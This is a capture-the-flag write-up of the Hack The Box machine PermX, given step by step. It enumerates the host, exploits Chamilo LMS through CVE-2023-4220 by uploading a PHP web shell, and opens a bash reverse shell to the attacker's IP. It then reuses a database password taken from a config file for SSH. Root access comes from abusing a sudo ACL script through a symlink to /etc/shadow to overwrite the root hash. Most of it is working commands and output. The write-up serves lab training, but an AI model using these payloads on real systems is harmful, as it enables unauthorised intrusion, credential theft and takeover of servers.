#HacktheBox 

![](images/Pasted%20image%2020240707082928.png)
![](images/Pasted%20image%2020240707082955.png)

# **Information Gathering and Reconnaissance**

Starting with `nmap` for open ports:

```bash
sudo nmap -sC -sV -p 22,80 10.10.11.23 -oN nmap.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-06 23:02 EDT
Nmap scan report for 10.10.11.23
Host is up (0.33s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.20 second
```

From the output it seems it's a `Ubuntu (Linux)` machine and in port 80 it redirect us to `permx.htb` So adding this in our host file.

Upon visiting this site i enumerate and seems like its a `static` webpage.

I go for `Dir enumeration` and `VHOST` fuzzing.

```bash
ffuf -u http://10.10.11.23 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.permx.htb" -mc all -ac


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.23
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 228ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 242ms]

```

We get `lms` subdomain so add it in host file .

So visiting the url:

`http://lms.permx.htb/`

![](images/Pasted%20image%2020240707110621.png)
There is an admin portal:

![](images/Pasted%20image%2020240707110707.png)

* Chamilo is a learning management system (LMS) that can be installed on Windows, Linux, Mac OS X and UNIX servers

* Chamilo is an open-source PHP-based Learning Management System (LMS) that facilitates online education and training. It offers features such as course creation, content management, assessments, collaboration and delivering educational resources.

I search for exploit and i get 3 CVE:

`# (CVE-2023-3545) Chamilo LMS Htaccess File Upload Security Bypass`

`# (CVE-2023-3368) Chamilo LMS Unauthenticated Command Injection`

`# (CVE-2023-4220) Chamilo LMS Unauthenticated Big Upload File Remote Code Execution`

I try all of them .

# **(CVE-2023-3545)**

```bash
python3 exploit.py -u http://lms.permx.htb/ -c 'id > /tmp/pwned'
An error has occured, URL is not vulnerable: http://lms.permx.htb/

```

Failed:

# **(CVE-2023-3368)**

```bash
python exploit1.py -u http://lms.permx.htb/ rce -p system id   
Overwriting session file at: ../../../../../../../../tmp/sess_eaHjF96SMbAmPWbjRxnZsfow6XBovJpN
Setting ch_sid=eaHjF96SMbAmPWbjRxnZsfow6XBovJpN
Invoking system() with arguments: id
Found data:

URL not vulnerable: http://lms.permx.htb/

```

Failed:

# **(CVE-2023-4220)**

Reference: [(CVE-2023-4220) Chamilo LMS Unauthenticated Big Upload File Remote Code Execution | STAR Labs](https://starlabs.sg/advisories/23/23-4220/)

![](images/Pasted%20image%2020240707111134.png)

## **Summary**

`The big file upload functionality by `/main/inc/lib/javascript/bigupload/inc/bigUpload.php` allows arbitrary files to be uploaded to `/main/inc/lib/javascript/bigupload/files` directory within the web root. Note that although this directory does not exist by default, it may be created using another arbitrary directory creation vulnerability (e.g. [CVE-2023-3368](https://github.com/chamilo/chamilo-lms/blob/v1.11.20/main/webservices/additional_webservices.php#L122-L133)) for the exploit to be successful.

An unauthenticated attacker may exploit this vulnerability to perform stored cross-site scripting attacks, as well as obtain remote code execution.`

# **POC**

```bash
echo '<?php system("id"); ?>' > rce.php

curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
The file has successfully been uploaded.

curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Here we can see exploit properly worked:

Let's take a rev shell:

```bash
echo "<?php system(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.15/4444 0>&1'\"); ?>" > rev.php

curl -F 'bigUploadFile=@rev.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
The file has successfully been uploaded.

curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rev.php'
```

Now in the listener:

```bash
nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.16.15] from permx.htb [10.10.11.23] 36174
bash: cannot set terminal process group (1166): Inappropriate ioctl for device
bash: no job control in this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ whoami
<ilo/main/inc/lib/javascript/bigupload/files$ whoami                     
www-data

```

We Successfully get user shell:

# **Priv Esc to mtz user**

```bash
www-data@permx:/home$ ls
ls
mtz
```

here we see `mtz` user is there so in order to get the user flag i need this user pass:

Here i know that the password would be in configuration file so looking in internet i get full path to configuration file:

![](images/Pasted%20image%2020240707114237.png)


![](images/Pasted%20image%2020240707113641.png)

`/var/www/chamilo/app/config`

Now i use `cat` to read that configuration file:

![](images/Pasted%20image%2020240707114520.png)

Here i get a pass but not sure about it so test it to `mtz`:

Pass - `03F6lY3uXAP2bkW8`

```bash
ssh mtz@10.10.11.23   
The authenticity of host '10.10.11.23 (10.10.11.23)' can't be established.
ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.23' (ED25519) to the list of known hosts.
mtz@10.10.11.23's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

mtz@permx:~$ whoami
mtz
mtz@permx:~$ 

```

Here we successfully get `mtz` shell.

```bash
mtz@permx:~$ cat user.txt 
8d0d747e7c31b9ce287e1e13264712bd
```

# **Priv Esc to Root**

First thing i try to check `sudo -l`

```bash
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh

```

User `mtz` can run `/opt/acl.sh` with `root` priv:

For the Root Section the acl.sh script changes the access control , So i import shadow file using symbolic link and change its AC and then use `sudo` binary to modify the shadow file. 

```bash
mtz@permx:~$ cat /home/mtz/f/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
```

Here i change `admin` password to my password:

First create a pass of `yescript` algo:

```bash
openssl passwd -6

Password: 
Verifying - Password: 
$6$dg6KwlMetQd1RWxJ$A6n0hxhWjtyo6PdG5NKjp3qopx7dHOvLf8bjIgc8i8WwpuYQoVEyvA5ZMS.fB2PpWQjqZgXPK4Zbpy7xgFkDM.
```
Here in pass i write `password`.

`1- Create a symbolic link to `/etc/shadow`

```bash
ln -s /etc/shadow /home/mtz/shadow_link
```

`2- Modify the ACL to allow writing to the symlink:`

```bash
sudo /opt/acl.sh mtz rw /home/mtz/shadow_link

```

`3-Edit the `/etc/shadow` file:`

```bash
nano /home/mtz/shadow_link
```

`4- Replace the root password hash:`

```bash
root:$6$dg6KwlMetQd1RWxJ$A6n0hxhWjtyo6PdG5NKjp3qopx7dHOvLf8bjIgc8i8WwpuYQoVEyvA5ZMS.fB2PpWQjqZgXPK4Zbpy7xgFkDM.:19742:0:99999:7:::
```

and save the file:

Then:

```bash
mtz@permx:/$ su root
Password: 
root@permx:/# id
uid=0(root) gid=0(root) groups=0(root)

root@permx:~# cat root.txt
315de01530b14a7285affa93eee31f34
```

In this way we solved the machine:


## Reference : [Symlink Attack: What is that? > Technical Tips and Guides (mangohost.net)](https://mangohost.net/blog/symlink-attack-what-is-that/)
